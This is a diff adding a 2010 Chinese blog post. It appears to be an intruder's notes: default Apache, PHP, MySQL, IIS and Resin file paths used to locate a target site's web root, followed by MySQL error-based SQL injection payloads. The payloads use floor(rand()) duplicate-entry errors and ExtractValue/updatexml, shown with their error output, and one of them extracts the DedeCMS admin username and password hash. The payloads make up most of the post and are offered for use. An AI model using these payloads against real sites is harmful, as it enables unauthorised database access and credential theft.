@@ -1,0 +1,98 @@
+linux下Apache、php、mysql默认安装路径—编译者的回看
+星期一, 十月 11th, 2010 | Author: 智友工作室closeAuthor: 智友工作室 Name: zy li
+Email: service@i5a6.com
+Site: http://www.i5a6.com/
+About: asp,php,java混合程序员一个See Authors Posts (132) | linux, php | 11,513 views 
+自己一直是编译安装，安装目录分配的很清楚，今天看到一个朋友的，发现自己不认识了，看了下是默认安装的，
+对默认安装的目录结构不熟悉，网上找了下，有朋友列的很清楚，自己摘录，留着自己用也方便~
+
+
+在 /usr/local/apache/conf/extra 中文件中翻到了 目标站的 路径
+我当时 怎么没想到呢 ？ 一般 现在 比较少管理员 会用默认的 Apache 了 新装的 Apache 目录一般都是这个位置
+
+
+apache:
+如果采用RPM包安装，安装路径应在 /etc/httpd目录下
+apache配置文件:/etc/httpd/conf/httpd.conf
+Apache模块路径：/usr/sbin/apachectl
+web目录:/var/www/html
+如果采用源代码安装，一般默认安装在/usr/local/apache2目录下 
+
+php:
+如果采用RPM包安装，安装路径应在 /etc/目录下
+php的配置文件:/etc/php.ini
+如果采用源代码安装，一般默认安装在/usr/local/lib目录下
+php配置文件: /usr/local/lib/php.ini
+或/usr/local/php/etc/php.ini 
+
+mysql:
+如果采用RPM包安装，安装路径应在/usr/share/mysql目录下
+mysqldump文件位置：/usr/bin/mysqldump
+mysqli配置文件:
+/etc/my.cnf或/usr/share/mysql/my.cnf
+mysql数据目录在/var/lib/mysql目录下
+如果采用源代码安装，一般默认安装在/usr/local/mysql目录下 
+
+
+
+c:\\windows\\system32\\inetsrv\\MetaBase.xml
+
+magic_quotes_gpc()=OFF，但是怎么报错都不出路径。后来想到可以根据解析器去找web路径，resin的配置文件中有web路径，可以尝试resin默认安装路径找到配置文件。
+c:/Resin-3.0.14/conf/resin.conf
+d:/Resin-3.0.14/conf/resin.conf
+e:/Resin-3.0.14/conf/resin.conf
+f:/Resin-3.0.14/conf/resin.conf
+c:/Resin/conf/resin.conf
+d:/Resin/conf/resin.conf
+e:/Resin/conf/resin.conf
+f:/Resin/conf/resin.conf
+
+在很多的情况 下我们不能直接方便的进行注入，于是有了BENCHMARK延迟注射；
+如果能得到MySQL的错误信息的话(必须是程序主动输出mysql错误，php中是调用mysql_error()，其他脚本可能有自己的函数)，现在又有了更方便的方法。
+网上流传了两三种方法:
+=========================================================================
+
+第一种略，略过了，低版本mysql适用
+
+http://hi.baidu.com/toby57/blog/item/26416060c1d92c48eaf8f839.html
+
+=========================================================================
+
+第二种：
+
+SELECT 1 FROM (select count(*),concat(floor(rand(0)*2),(SELECT ‘x’))a from information_schema.tables group by a)b;
+
+ERROR 1062 (23000): Duplicate entry ’1x’ for key ‘group_key’
+
+这种方法对MySQL版本没什么要求，但只能爆出64字节的数据，用这种方法遇到大数据只能MID慢慢来了。
+
+(select 1 from (select count(*),concat((+++),floor(rand(0)*2))x from information_schema.tables group by x)k)
+
+=========================================================================
+
+第三种：
+
+通过对ExtractValue和updataxml函数传递不合XPATH语法规则的参数来爆出数据。(只针对MySQL 5.1++,低于5.1的无此函数)
+
+SELECT 1 AND ExtractValue(1, CONCAT(0x5c,(SELECT @@VERSION)))
+
+ERROR 1105 (HY000): XPATH syntax error: ‘\5.1.40-community’
+
+SELECT 1 FROM dede_admin WHERE updatexml(1,(SELECT CONCAT(0x5b,uname,0x3a,MID(pwd,4,16),0x5d) FROM dede_admin),1);
+
+ERROR 1105 (HY000): XPATH syntax error: ‘[admin:7a57a5a743894a0e]‘
+
+updatexml(1,CONCAT(0x5c,(SELECT @@VERSION)),1);
+
+比上一种方法方便简洁，不过这方法只能爆出32字节的数据。同样，大数据只能Mid了。
+
+百度一下这两个函数：
+EXTRACTVALUE (XML_document, XPath_string);
+第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc
+第二个参数：XPath_string (Xpath格式的字符串)。
+作用：从目标XML中返回包含所查询值的字符串
+UPDATEXML (XML_document, XPath_string, new_value);
+第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc
+第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。
+第三个参数：new_value，String格式，替换查找到的符合条件的数据
+作用：改变文档中符合条件的节点的值
